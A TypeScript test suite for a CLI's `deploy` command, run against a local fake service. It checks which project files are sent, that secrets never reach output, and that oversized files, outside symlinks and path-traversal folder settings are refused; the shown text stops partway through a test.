/**
 * `mason deploy` AGAINST A FAKE HOSTED SERVICE (no network: an http server of this test's on 127.0.0.1, which plain
 * http may name): the real CLI as a child process, run in a project folder of its own, its service `MASON_CLOUD_URL`,
 * its home a temp folder. The contract is docs/HOSTED-API.md "Deploying a project"; what each test holds is in its
 * name. Every run's stdout and stderr is held to never carrying a token (`mason`, and the last test).
 */
import { test, after } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as http from "node:http";
import * as os from "node:os";
import * as path from "node:path";
import { createHash, randomBytes } from "node:crypto";
import { matrixEnv, runMason, type Answer } from "./cli-matrix.ts";
import { projectFiles } from "../src/lib/project-files.ts";
import { exitOf, FAILURE_CODES } from "../src/cli/command.ts";
import { bodyCovered, bodyShown, echoForms, echoToken, seen } from "./hosted-fake.ts";
import { pathToFileURL } from "node:url";

const newToken = (kind: "pat" | "ci" = "pat"): string => `masondata_${kind}_${randomBytes(32).toString("base64url")}`;
const SECRETS: string[] = [];
const ANSWERS: Answer[] = [];
const made: string[] = [];
after(() => { for (const d of made) fs.rmSync(d, { recursive: true, force: true }); });

interface Req { method: string; path: string; headers: http.IncomingHttpHeaders; body: string }
type Reply = { status: number; body?: unknown; raw?: string; headers?: Record<string, string> } | "drop";
interface Script {
  post?: Reply;
  /** the n-th GET's answer (0-based) */
  get?: (n: number) => Reply;
}

const CREATED = "2026-11-02T10:00:00Z";
const ID = "dep_01abc";
const queued: Reply = { status: 201, body: { deploy: { id: ID, status: "queued", createdAt: CREATED } }, headers: { "retry-after": "1" } };
const at = (status: string, more: Record<string, unknown> = {}): Reply => ({ status: 200, headers: { "retry-after": "1" },
  body: { deploy: { id: ID, status, createdAt: CREATED, ...(["running", "refused", "failed"].includes(status) ? { finishedAt: "2026-11-02T10:01:00Z" } : {}), ...more } } });

/** A fake service: answers as `script` says, records every request. */
async function fakeService(script: Script): Promise<{ url: string; requests: Req[]; close: () => Promise<void> }> {
  const requests: Req[] = [];
  let gets = 0;
  const server = http.createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (b: Buffer) => chunks.push(b));
    req.on("end", () => {
      const p = new URL(req.url ?? "/", "http://x").pathname;
      requests.push({ method: req.method ?? "", path: p, headers: req.headers, body: Buffer.concat(chunks).toString("utf8") });
      const reply: Reply = req.method === "POST" && p === "/v1/replicas/acme/shop/deploys" ? script.post ?? queued
        : req.method === "GET" && p === `/v1/replicas/acme/shop/deploys/${ID}` ? (script.get ?? (() => at("running")))(gets++)
        : { status: 404, body: { error: { code: "not_found", message: "no such endpoint" }, next: [] } };
      if (reply === "drop") { req.socket.destroy(); return; }
      res.writeHead(reply.status, { "content-type": reply.raw === undefined ? "application/json" : "text/html", ...reply.headers });
      res.end(reply.raw ?? (reply.body === undefined ? "" : JSON.stringify(reply.body)));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as { port: number }).port;
  return { url: `http://127.0.0.1:${port}`, requests, close: () => new Promise((resolve) => { server.closeAllConnections(); server.close(() => resolve()); }) };
}

const SOURCE = "kind: postgres\nurl: ${DATABASE_URL}\nsync: off\ntables:\n  orders: {}\n  customers:\n    columns: [id, name]\n";
const ROLES = "default: everything\nroles:\n  everything:\n    tables: all\n  agent:\n    tables:\n      orders: {}\n";
const DAILY = "kind: scheduled\ntarget_lag: 5m\nsql: |\n  SELECT count(*) AS n FROM orders\n";

/** A temp folder of the test's own. */
function temp(prefix: string): string {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  made.push(d);
  return fs.realpathSync(d);
}

/** A project folder as `mason init` leaves one (its config, its sources file, mason.yml, roles.yml), with `files` more
 *  under mason/ (relative path → text; null removes one). */
function project(files: Record<string, string | Buffer | null> = {}): { root: string; folder: string } {
  const root = temp("mason-deploy-");
  fs.mkdirSync(path.join(root, ".mason"), { mode: 0o700 });
  fs.writeFileSync(path.join(root, ".mason", "config.json"), JSON.stringify({ name: "shop", folder: "mason", remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
  const folder = path.join(root, "mason");
  const all: Record<string, string | Buffer | null> = { "sources/shop.yml": SOURCE, "mason.yml": "version: 0.7.0\n", "roles.yml": ROLES, ...files };
  for (const [rel, text] of Object.entries(all)) {
    if (text === null) continue;
    fs.mkdirSync(path.dirname(path.join(folder, rel)), { recursive: true });
    fs.writeFileSync(path.join(folder, rel), text);
  }
  return { root, folder };
}

const envFor = (h: string, url: string, extra: Record<string, string> = {}): Record<string, string> => matrixEnv({ HOME: h, PATH: path.dirname(process.execPath), MASON_CLOUD_URL: url, ...extra });

/** The terminal a run is given (`{ terminal: 80 }`): a preload that makes its stdout and stderr say they are a terminal
 *  that wide, colour off (as tests/hosted-fake.ts gives login's runs; nothing in src/ reads a test's variable). */
function terminalEnv(width: number): Record<string, string> {
  const dir = temp("mason-terminal-");
  const hook = path.join(dir, "terminal.mjs");
  fs.writeFileSync(hook, `for (const s of [process.stdout, process.stderr]) {
  Object.defineProperty(s, "isTTY", { value: true, configurable: true });
  Object.defineProperty(s, "columns", { value: ${width}, configurable: true });
}
`);
  return { NODE_OPTIONS: `--import=${pathToFileURL(hook).href}`, NO_COLOR: "1" };
}

/**
 * THE LINES MASON DEPLOY BEGINS, all of them (tests/hosted-fake.ts's rule for login, in deploy's own words): a line that
 * begins otherwise is a value's — the service's text took a line's start. On a terminal too narrow for one, the CLI
 * breaks it at a space (src/cli/command.ts strictLines), so a line may also be a WORD-PREFIX of one ("✗ mason",
 * "  mason deploy"). Besides these: a blank, the one `Next:`, a continuation indented 4 or more, and the usage of a
 * wrong line (the CLI's text, read no further).
 */
const STEP_WORDS = ["Queued: ", "Applying: ", "Starting: ", "Running: ", "Refused by Mason on the replica", "The deploy failed"];
const FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
const HEADS: readonly string[] = [
  "Deployed to ", "Would send ", "Sent ", "✘ mason deploy: ", "✗ mason deploy: ",
  ...STEP_WORDS.flatMap((w) => [`  ${w}`, ...["✔", "✓", "✘", "✗", ...FRAMES].map((m) => `${m} ${w}`)]),
  "  the service could not say more just now ", "  ! ",
  ...["deploy", "service", "files", "took", "why", "fix"].map((l) => `  ${l} `),
];
/** The steps under Next:, the CLI's own, as the start of their line. */
const STEP_HEADS: readonly string[] = ["  mason deploy --replica acme/shop", "  mason deploy --replica <org>/<name>", "  mason deploy --help", "  mason login", "  mason init",
  "  unset MASON_CLOUD_URL", "  chmod 600 ", "  chmod 700 "];
/** A dry run's row begins with a file's path, as this test's projects name them (this machine's own words, never the
 *  service's): on a narrow terminal the path itself is broken, so its row may begin with a part of it. */
const DRY_PATHS = ["generated_tables/weekly.yml", "mason.yml", "roles.yml", "sources/shop.yml"];
const dryRow = (line: string): boolean => {
  const m = /^ {2}(\S+)( |$)/.exec(line);
  return m !== null && DRY_PATHS.some((p) => p === m[1] || (p.startsWith(m[1]!) && m[2] === ""));
};

/** Whether `line` is begun as one of `heads` begins, or is a word-prefix of one (the rest broken onto continuations). */
const begunAs = (line: string, heads: readonly string[]): boolean => heads.some((h) => {
  if (line.startsWith(h)) return h.endsWith(" ") || line.length === h.length || /^\s/.test(line.slice(h.length));
  const l = line.trimEnd();
  return l.trim() !== "" && h.startsWith(l) && (h.length === l.length || h[l.length] === " ");
});

/** What is wrong with what a person sees of one stream of deploy (`seen`, at `width` on a terminal): a line it did not
 *  begin, a second Next:, a failure where there is none or a second, a step under Next: that is not its own, a line the
 *  terminal broke. `failed`: this is the stderr of a run that failed, which then holds exactly one failure. */
function deploySeenProblems(text: string, width: number | null, failed: boolean | null): string[] {
  const p: string[] = [];
  const dry = /^Would( |\n)/.test(text);
  let afterNext = false, nexts = 0, failures = 0;
  for (const { line, byTerminal } of seen(text, width)) {
    if (byTerminal) p.push(`the terminal broke a line, so a line begins where a value chose: ${JSON.stringify(line)}`);
    if (/^usage: mason deploy( |$)/.test(line) || line === "usage:") break;
    if (line.trim() === "") continue;
    if (line === "Next:") { nexts++; afterNext = true; continue; }
    if (/^ {4,}\S/.test(line)) continue;
    if (/^[✘✗] mason/.test(line)) failures++;
    if (afterNext && /^ {2}\S/.test(line)) { if (!begunAs(line, STEP_HEADS)) p.push(`a step the CLI does not give: ${JSON.stringify(line)}`); continue; }
    if (!begunAs(line, HEADS) && !(dry && dryRow(line))) p.push(`a line the CLI does not begin: ${JSON.stringify(line)}`);
  }
  if (nexts > 1) p.push(`${nexts} Next: headings`);
  if (failed !== null && failures !== (failed ? 1 : 0)) p.push(`${failures} failures, where the run ${failed ? "failed once" : "did not fail"}`);
  else if (failures > 1) p.push(`${failures} failures`);
  return p;
}

/** Every step mason deploy gives, in every state: its own, never the service's. */
const OWN_STEP = /^ {2}(mason deploy --replica (acme\/shop|<org>\/<name>)|mason deploy --help|mason login|mason init|unset MASON_CLOUD_URL|chmod (600|700) \S+)(\s|$)/;

/**
 * One run in `cwd`, held at once to carrying no secret on either stream, and to the service's values never shaping it
 * (#481's rule, as tests/cli-login.test.ts holds login to it): a failure's code is one of the CLI's and its exit that
 * code's; no line begins with what a hostile value carried (FORGED); each stream has one Next: at most, every step under
 * it the CLI's; and no --json string holds a line break.
 */
async function mason(cwd: string, argv: string[], env: Record<string, string>, o: { timeoutMs?: number; terminal?: number } = {}): Promise<Answer> {
  const a = await runMason(cwd, argv, o.terminal ? { ...env, ...terminalEnv(o.terminal) } : env, o.timeoutMs ?? 60_000);
  ANSWERS.push(a);
  const line = `mason ${argv.join(" ")}${o.terminal ? ` (a terminal ${o.terminal} wide)` : ""}`;
  if (argv.includes("--json") && a.code !== 0) {
    const e = (JSON.parse(a.stdout) as { error?: { code?: string } }).error;
    assert.ok(e?.code !== undefined && Object.hasOwn(FAILURE_CODES, e.code), `${line}: code ${e?.code} is not one of FAILURE_CODES`);
    assert.equal(a.code, exitOf({ message: "", code: e.code }), `${line}: exit ${a.code}, where ${e.code} exits ${exitOf({ message: "", code: e.code })}`);
  }
  // every line a person sees is one the CLI began: visual lines at the terminal's width for a run on a terminal, the
  // logical lines of a pipe otherwise; under --json, stderr alone (stdout is the data)
  for (const [stream, text] of argv.includes("--json") ? [["stderr", a.stderr]] as const : [["stdout", a.stdout], ["stderr", a.stderr]] as const) {
    assert.ok(!text.split("\n").some((l) => /^\s*FORGED/.test(l)), `${line}: a line of ${stream} begins with the service's text:\n${text}`);
    assert.deepEqual(deploySeenProblems(text, o.terminal ?? null, stream === "stderr" && !argv.includes("--json") ? a.code !== 0 : null), [], `${line}: what a person sees of its ${stream}:\n${text}`);
  }
  if (argv.includes("--json")) {
    const v = JSON.parse(a.stdout) as { next: Array<{ command: string }>; error?: { code?: string } };
    const walk = (x: unknown, at: string): void => {
      if (typeof x === "string") assert.doesNotMatch(x, /[\n\r\u0085\u2028\u2029]/, `${line} --json ${at} holds a line break: ${JSON.stringify(x)}`);
      else if (Array.isArray(x)) x.forEach((y, i) => walk(y, `${at}[${i}]`));
      else if (typeof x === "object" && x !== null) for (const [k, y] of Object.entries(x)) walk(y, `${at}.${k}`);
    };
    // the one exception: a refusal of the project's own files (bad_source, bad_roles) lists its mistakes a line each in
    // why, or the file to write in fix, as every command does (sourceFailure, rolesFailure, readSource) — this machine's
    // words, met before anything is sent; no service failure has those codes (codeOfStatus, failureShape)
    const local = ["bad_source", "bad_roles"].includes(v.error?.code ?? "");
    walk(local ? { ...v, error: { ...v.error, why: "", fix: "" } } : v, "");
    for (const n of v.next) assert.match(`  ${n.command}`, OWN_STEP, `${line} --json: a step the CLI does not give: ${n.command}`);
  }
  for (const s of SECRETS) {
    assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `${line} printed a secret:\n${a.stdout}\n${a.stderr}`);
    assert.ok(!a.stdout.includes(s.slice(-43)) && !a.stderr.includes(s.slice(-43)), `${line} printed a secret's body`);
    assert.ok(!bodyShown(`${a.stdout}\n${a.stderr}`, s, [cwd, env.HOME, env.MASON_CLOUD_URL]), `${line} printed more than a quarter of a secret's body, in some form:\n${a.stdout}\n${a.stderr}`);
  }
  return a;
}

/** A run against a fresh fake, signed in by MASON_TOKEN; the fake's requests with it. */
async function deployWith(script: Script, cwd: string, argv: string[], extra: Record<string, string> = {}, o: { terminal?: number } = {}): Promise<{ a: Answer; requests: Req[]; url: string; token: string; home: string }> {
  // a token the caller gives is its own to record
  const token = extra.MASON_TOKEN ?? newToken("ci");
  if (extra.MASON_TOKEN === undefined) SECRETS.push(token);
  const fake = await fakeService(script);
  try {
    const h = temp("mason-home-");
    const a = await mason(cwd, ["deploy", ...argv], envFor(h, fake.url, { MASON_TOKEN: token, ...extra }), o);
    return { a, requests: fake.requests, url: fake.url, token, home: h };
  } finally { await fake.close(); }
}

const sha = (b: Buffer | string): string => createHash("sha256").update(b).digest("hex");

test("mason deploy: the files sent are projectFiles of the project folder, whole, each with its sha256 — never .env, .mason/, a dotfile or a file that is not YAML; then the replica runs it", async () => {
  const { root, folder } = project({
    "generated_tables/daily.yml": DAILY,
    // beside the project: none of these is sent
    ".env": "DATABASE_URL=postgres://u:hunter2@db.example/prod\n",
    ".mason/state.yml": "x: 1\n",
    ".editor.yml": "a: 1\n",
    "notes.txt": "a note\n",
    "settings.json": "{ \"readme\": 1 }\n",
  });
  fs.writeFileSync(path.join(root, ".env"), "DATABASE_URL=postgres://u:hunter2@db.example/prod\n");
  fs.writeFileSync(path.join(root, ".mason", "duck.yml"), "x: 1\n");
  const { a, requests, token } = await deployWith({}, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 0, a.stderr);
  const posts = requests.filter((r) => r.method === "POST");
  assert.equal(posts.length, 1);
  const post = posts[0]!;
  assert.equal(post.path, "/v1/replicas/acme/shop/deploys");
  assert.equal(post.headers.authorization, `Bearer ${token}`);
  assert.equal(post.headers["content-type"], "application/json");
  assert.match(String(post.headers["user-agent"]), /^mason-cli\//);
  const body = JSON.parse(post.body) as { files: Array<{ path: string; sha256: string; content: string }>; client: { version: string } };
  assert.deepEqual(Object.keys(body), ["files", "client"]);
  assert.deepEqual(body.client, { version: "dev" });
  // the authority: the one list of a project's files, as paths relative to the folder with / between parts
  const expected = projectFiles(folder).map((f) => path.relative(folder, f).split(path.sep).join("/"));
  assert.deepEqual(expected, ["generated_tables/daily.yml", "mason.yml", "roles.yml", "sources/shop.yml"]);
  assert.deepEqual(body.files.map((f) => f.path), expected);
  for (const f of body.files) {
    const bytes = fs.readFileSync(path.join(folder, f.path));
    assert.deepEqual(Object.keys(f), ["path", "sha256", "content"]);
    assert.equal(f.content, bytes.toString("utf8"));
    assert.equal(f.sha256, sha(bytes));
  }
  assert.doesNotMatch(post.body, /hunter2|a note|readme|x: 1|a: 1/, "nothing beside the project's files");
  // the outcome, once
  assert.equal(requests.filter((r) => r.method === "GET").length, 1);
  assert.match(a.stdout, /^Deployed to acme\/shop: the replica runs it\n {2}deploy {4}dep_01abc\n {2}service {3}http:\/\/127\.0\.0\.1:\d+\n {2}files {5}4 \(\d+ bytes\)\n {2}took {6}\d+ s\n\nNext:\n {2}mason deploy --replica acme\/shop +deploy again, after the next edit\n$/);
});

test("mason deploy: no database is read and no .env needed — the URL is the replica's environment's", async () => {
  // ${DATABASE_URL} set nowhere: mason start would refuse it, a deploy sends it (the replica's environment names it)
  const { root } = project();
  const { a, requests } = await deployWith({}, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(a.code, 0, a.stdout + a.stderr);
  assert.equal(requests.filter((r) => r.method === "POST").length, 1);
  const v = JSON.parse(a.stdout) as Record<string, unknown>;
  assert.deepEqual(Object.keys(v), ["dryRun", "replica", "service", "files", "totalBytes", "warnings", "deploy", "next"]);
  assert.equal(v.dryRun, false);
  assert.equal(v.replica, "acme/shop");
  assert.deepEqual(v.deploy, { id: ID, status: "running", phase: null, createdAt: CREATED, finishedAt: "2026-11-02T10:01:00Z" });
  assert.equal(a.stderr, "", "--json prints no progress");
});

test("mason deploy --dry-run: each path, its size and its sha256, and no request at all (no login needed)", async () => {
  const { root, folder } = project();
  const fake = await fakeService({});
  try {
    const env = envFor(temp("mason-home-"), fake.url);
    const a = await mason(root, ["deploy", "--replica", "acme/shop", "--dry-run"], env);
    assert.equal(a.code, 0, a.stderr);
    const rows = ["mason.yml", "roles.yml", "sources/shop.yml"].map((p) => {
      const b = fs.readFileSync(path.join(folder, p));
      return { path: p, size: b.length, sha256: sha(b) };
    });
    const w = Math.max(...rows.map((r) => r.path.length)), sw = Math.max(...rows.map((r) => `${r.size} bytes`.length));
    const total = rows.reduce((n, r) => n + r.size, 0);
    assert.equal(a.stdout, `Would send 3 files, ${total} bytes, to acme/shop on ${fake.url}; nothing was sent\n` +
      rows.map((r) => `  ${r.path.padEnd(w)}   ${`${r.size} bytes`.padStart(sw)}   sha256 ${r.sha256}\n`).join("") +
      "\nNext:\n  mason deploy --replica acme/shop              send it\n");
    const j = await mason(root, ["deploy", "--dry-run", "--json"], env);
    assert.equal(j.code, 0, j.stdout);
    const v = JSON.parse(j.stdout) as { dryRun: boolean; replica: unknown; files: unknown; totalBytes: number; deploy: unknown };
    assert.equal(v.dryRun, true);
    assert.equal(v.replica, null, "a dry run needs no replica");
    assert.deepEqual(v.files, rows);
    assert.equal(v.totalBytes, total);
    assert.equal(v.deploy, null);
    assert.deepEqual(fake.requests, [], "a dry run makes no request");
  } finally { await fake.close(); }
});

test("mason deploy: a project mason start would refuse is refused here, in the failure shape, and nothing is sent", async () => {
  const cases: Array<[string, Record<string, string | null>, RegExp, string]> = [
    ["a sources file's mistake", { "sources/shop.yml": "kind: postgres\nurl: ${DATABASE_URL}\ntabels: {}\n" }, /^✗ mason deploy: mason\/sources\/shop\.yml has 2 mistakes|^✗ mason deploy: mason\/sources\/shop\.yml: /m, "bad_source"],
    ["no sources file", { "sources/shop.yml": null }, /^✗ mason deploy: this project names no database: mason\/sources\/ has no source file$/m, "bad_source"],
    ["a role naming a table the sources file does not sync", { "roles.yml": "roles:\n  agent:\n    tables:\n      invoices: {}\n" }, /^✗ mason deploy: mason\/roles\.yml: roles\.agent\.tables\.invoices: public\.invoices is not a table the sources file syncs/m, "bad_roles"],
    ["a mason.yml that is not a pin", { "mason.yml": "version: banana\n" }, /^✗ mason deploy: .*mason\.yml: version "banana" is not a version/m, "refused"],
    ["a url: written with its password", { "sources/shop.yml": "kind: postgres\nurl: postgres://app:s3cret@db.example:5432/shop\ntables: {}\n" }, /^✗ mason deploy: mason\/sources\/shop\.yml: url: is written with its password$/m, "refused"],
  ];
  for (const [what, files, said, code] of cases) {
    const { root } = project(files);
    const { a, requests } = await deployWith({}, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, `${what}: ${a.stderr}`);
    assert.match(a.stderr, said, what);
    assert.doesNotMatch(a.stderr, /s3cret/, `${what}: the password is never repeated`);
    assert.deepEqual(requests, [], `${what}: nothing sent`);
    const j = await deployWith({}, root, ["--replica", "acme/shop", "--json"]);
    assert.equal((JSON.parse(j.a.stdout) as { error: { code: string } }).error.code, code, what);
    assert.deepEqual(j.requests, [], `${what}: nothing sent`);
  }
  // the password refusal says the way out whole
  const { root } = project({ "sources/shop.yml": "kind: postgres\nurl: postgres://app:s3cret@db.example:5432/shop\ntables: {}\n" });
  const { a } = await deployWith({}, root, ["--replica", "acme/shop"]);
  assert.equal(a.stderr, "✗ mason deploy: mason/sources/shop.yml: url: is written with its password\n" +
    "  why   a deploy sends the project's files to the service, which keeps them: a password is never one of them\n" +
    "  fix   write url: ${DATABASE_URL} in mason/sources/shop.yml, and set DATABASE_URL on the replica (its own environment, on the service); keep the URL here in .env\n");
});

test("mason deploy: a refused generated table is said and sent, as mason start says it and goes on", async () => {
  const { root } = project({ "generated_tables/weekly.yml": "kind: live\nsql: SELECT 1\n" });
  const { a, requests } = await deployWith({}, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 0, a.stderr);
  assert.match(a.stderr, /^ {2}! mason\/generated_tables\/weekly\.yml: kind: live isn't available yet\.$/m);
  const body = JSON.parse(requests.find((r) => r.method === "POST")!.body) as { files: Array<{ path: string }> };
  assert.ok(body.files.some((f) => f.path === "generated_tables/weekly.yml"));
});

test("mason deploy: the bounds — a file over 256 KiB, the files over 1 MiB, a file not UTF-8, a link out of the folder — refused with the sizes, nothing sent", async () => {
  const big = project({ "notes/big.yml": `x: "${"a".repeat(256 * 1024)}"\n` });
  let r = await deployWith({}, big.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.equal(r.a.stderr, "✗ mason deploy: mason/notes/big.yml is 262,150 bytes, over the 262,144 bytes (256 KiB) a deploy sends of one file\n" +
    "  why   a project's files name tables, columns and SQL: none is that large\n" +
    "  fix   shorten it, or move it out of mason/ if Mason does not read it\n");
  assert.deepEqual(r.requests, []);

  const many: Record<string, string> = {};
  for (let i = 0; i < 5; i++) many[`notes/n${i}.yml`] = `x: "${"a".repeat(250 * 1024)}"\n`;
  const total = project(many);
  r = await deployWith({}, total.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  const sent = projectFiles(total.folder).reduce((n, f) => n + fs.statSync(f).size, 0);
  assert.match(r.a.stderr, new RegExp(`^✗ mason deploy: the project's files are ${sent.toLocaleString("en-US")} bytes in all, over the 1,048,576 bytes \\(1 MiB\\) a deploy sends\n {2}why {3}the largest: notes/n0\\.yml 256,006 bytes, `));
  assert.deepEqual(r.requests, []);

  const latin = project({ "notes/latin.yml": Buffer.from([0x61, 0x3a, 0x20, 0xe9, 0x0a]) });
  r = await deployWith({}, latin.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.match(r.a.stderr, /^✗ mason deploy: mason\/notes\/latin\.yml is not UTF-8 text$/m);
  assert.deepEqual(r.requests, []);

  const outside = temp("mason-outside-");
  fs.writeFileSync(path.join(outside, "secret.yml"), "token: abc\n");
  const linked = project();
  fs.symlinkSync(path.join(outside, "secret.yml"), path.join(linked.folder, "other.yml"));
  r = await deployWith({}, linked.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.equal(r.a.stderr, `✗ mason deploy: mason/other.yml is a symbolic link to ${path.join(outside, "secret.yml")}, outside the project folder\n` +
    "  why   a deploy sends the project folder's own files, and never follows a link out of it\n" +
    "  fix   put the file itself in mason/, or remove the link\n");
  assert.deepEqual(r.requests, []);

  // a project whose files are the application's folder itself: every YAML of the application would go
  const flat = project();
  fs.writeFileSync(path.join(flat.root, ".mason", "config.json"), JSON.stringify({ name: "shop", folder: ".", remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
  for (const f of ["sources", "mason.yml", "roles.yml"]) fs.renameSync(path.join(flat.folder, f), path.join(flat.root, f));
  fs.writeFileSync(path.join(flat.root, "docker-compose.yml"), "services: { db: { environment: { POSTGRES_PASSWORD: hunter2 } } }\n");
  r = await deployWith({}, flat.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.match(r.a.stderr, /^✗ mason deploy: this project's files are its folder's own \(mason init --folder \.\), beside the application's$/m);
  assert.deepEqual(r.requests, []);

  // a link inside the folder is the file it names, sent under the link's path
  const inside = project();
  fs.symlinkSync(path.join(inside.folder, "roles.yml"), path.join(inside.folder, "roles-copy.yml"));
  r = await deployWith({}, inside.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 0, r.a.stderr);

  // a folder the readers follow and the list does not (a linked sources/): refused, never checked here and missing there
  const away = temp("mason-sources-");
  fs.writeFileSync(path.join(away, "shop.yml"), SOURCE);
  const folderLink = project({ "sources/shop.yml": null });
  fs.rmSync(path.join(folderLink.folder, "sources"), { recursive: true, force: true });
  fs.symlinkSync(away, path.join(folderLink.folder, "sources"));
  r = await deployWith({}, folderLink.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.match(r.a.stderr, /^✗ mason deploy: mason\/sources\/shop\.yml is read by Mason, and is not among the files a deploy sends$/m);
  assert.deepEqual(r.requests, []);
});

test("mason deploy: the project's files must be a folder strictly inside its root — every spelling of the root itself or a place outside it is refused, nothing read or sent", async () => {
  // an application root inside a parent that holds YAML of its own (a CI file, a sibling's), with a project folder named
  // by config.json's "folder" — written by hand, as mason init refuses every outside spelling and writes "mason" itself
  const layout = (folder: (dirs: { app: string; parent: string; away: string }) => string): { app: string } => {
    const parent = temp("mason-parent-"), app = path.join(parent, "app"), away = temp("mason-away-");
    fs.mkdirSync(path.join(app, ".mason"), { recursive: true });
    fs.writeFileSync(path.join(app, ".mason", "config.json"), JSON.stringify({ name: "shop", folder: folder({ app, parent, away }), remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
    // a valid project everywhere it might be read from: the refusal is the folder's, never a mistake of the files
    for (const at of [parent, app, path.join(app, "mason"), away, path.join(parent, "sibling", "mason")]) {
      fs.mkdirSync(path.join(at, "sources"), { recursive: true });
      fs.writeFileSync(path.join(at, "sources", "shop.yml"), SOURCE);
      fs.writeFileSync(path.join(at, "mason.yml"), "version: 0.7.0\n");
    }
    fs.writeFileSync(path.join(parent, "ci.yml"), "token: from-the-parent\n");
    fs.mkdirSync(path.join(parent, "sibling"), { recursive: true });
    fs.writeFileSync(path.join(parent, "sibling", "k8s.yml"), "secret: from-a-sibling\n");
    fs.writeFileSync(path.join(app, "docker-compose.yml"), "password: from-the-app\n");
    fs.writeFileSync(path.join(away, "elsewhere.yml"), "secret: from-elsewhere\n");
    return { app };
  };
  const outside: Array<[string, (d: { app: string; parent: string; away: string }) => string]> = [
    ["..", () => ".."], ["../", () => "../"], ["../sibling/mason", () => "../sibling/mason"], ["mason/../..", () => "mason/../.."],
    ["the parent, absolute", (d) => d.parent], ["another folder, absolute", (d) => d.away], ["../app/../..", () => "../app/../.."],
  ];
  const atRoot: Array<[string, (d: { app: string; parent: string; away: string }) => string]> = [
    [".", () => "."], ["./", () => "./"], ["", () => ""], ["mason/..", () => "mason/.."], ["the root, absolute", (d) => d.app], ["../app", () => "../app"],
  ];
  for (const [kind, cases] of [["outside", outside], ["root", atRoot]] as const) {
    for (const [what, folder] of cases) {
      const { app } = layout(folder);
      for (const argv of [["--replica", "acme/shop"], ["--replica", "acme/shop", "--dry-run"], ["--replica", "acme/shop", "--json"]]) {
        const { a, requests } = await deployWith({}, app, argv);
        assert.equal(a.code, 1, `${what} ${argv.join(" ")}: ${a.stdout}${a.stderr}`);
        assert.deepEqual(requests, [], `${what}: nothing sent`);
        assert.doesNotMatch(a.stdout + a.stderr, /from-the-parent|from-a-sibling|from-the-app|from-elsewhere|ci\.yml|k8s\.yml|docker-compose/, `${what}: nothing of those files said`);
        const said = argv.includes("--json") ? (JSON.parse(a.stdout) as { error: { message: string } }).error.message : a.stderr;
        assert.match(said, kind === "root" ? /this project's files are its folder's own/ : /this project's files are outside its folder/, `${what}: ${said}`);
      }
    }
  }
  // a project folder that is a link out of the root is outside, by its real path
  {
    const { app } = layout(() => "mason");
    fs.rmSync(path.join(app, "mason"), { recursive: true });
    const away = temp("mason-linked-");
    fs.mkdirSync(path.join(away, "sources"));
    fs.writeFileSync(path.join(away, "sources", "shop.yml"), SOURCE);
    fs.symlinkSync(away, path.join(app, "mason"));
    const { a, requests } = await deployWith({}, app, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, a.stderr);
    assert.match(a.stderr, /this project's files are outside its folder/);
    assert.deepEqual(requests, []);
  }
  // every spelling of a folder strictly inside is the project's own, and sends that folder's files alone
  for (const folder of ["mason", "./mason", "mason/", "./mason/../mason"]) {
    const { app } = layout(() => folder);
    const { a, requests } = await deployWith({}, app, ["--replica", "acme/shop"]);
    assert.equal(a.code, 0, `${folder}: ${a.stderr}`);
    const body = JSON.parse(requests.find((r) => r.method === "POST")!.body) as { files: Array<{ path: string }> };
    assert.deepEqual(body.files.map((f) => f.path), ["mason.yml", "sources/shop.yml"], folder);
  }
  {
    const { app } = layout((d) => path.join(d.app, "mason"));
    const { a } = await deployWith({}, app, ["--replica", "acme/shop"]);
    assert.equal(a.code, 0, `absolute, inside: ${a.stderr}`);
  }
});

test("mason deploy: a project folder that cannot be resolved (a loop, a file as a folder, unreadable, too long) is refused saying why, in the failure shape, never a crash", async () => {
  // each a shape the system refuses to resolve, made in a project of its own; the folder named in config.json
  const shapes: Array<[string, RegExp, (root: string) => string]> = [
    ["a link to itself", /a symbolic link on the way leads back to itself \(a loop\) \(ELOOP\)/, (root) => { fs.symlinkSync("mason", path.join(root, "mason")); return "mason"; }],
    ["a loop of two links", /\(ELOOP\)/, (root) => { fs.symlinkSync("b", path.join(root, "a")); fs.symlinkSync("a", path.join(root, "b")); return "a"; }],
    ["a file as a folder", /a part of the path is a file, not a folder \(ENOTDIR\)/, (root) => { fs.writeFileSync(path.join(root, "docker-compose.yml"), "x: 1\n"); return "docker-compose.yml/mason"; }],
    ["a path too long", /the path is longer than this system takes \(ENAMETOOLONG\)/, () => Array.from({ length: 15 }, () => "x".repeat(300)).join("/")],
  ];
  // as root, a folder no user may read is read anyway: the unreadable shape is held where it can be made
  if (process.getuid?.() !== 0) {
    shapes.push(["a folder this user may not read", /may not be read by this user \(EACCES\)/, (root) => { fs.mkdirSync(path.join(root, "locked", "mason"), { recursive: true }); fs.chmodSync(path.join(root, "locked"), 0); return "locked/mason"; }]);
  }
  for (const [what, why, make] of shapes) {
    const root = temp("mason-unresolved-");
    fs.mkdirSync(path.join(root, ".mason"));
    const folder = make(root);
    fs.writeFileSync(path.join(root, ".mason", "config.json"), JSON.stringify({ name: "shop", folder, remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
    for (const argv of [["--replica", "acme/shop"], ["--replica", "acme/shop", "--dry-run"], ["--replica", "acme/shop", "--json"]]) {
      const { a, requests } = await deployWith({}, root, argv);
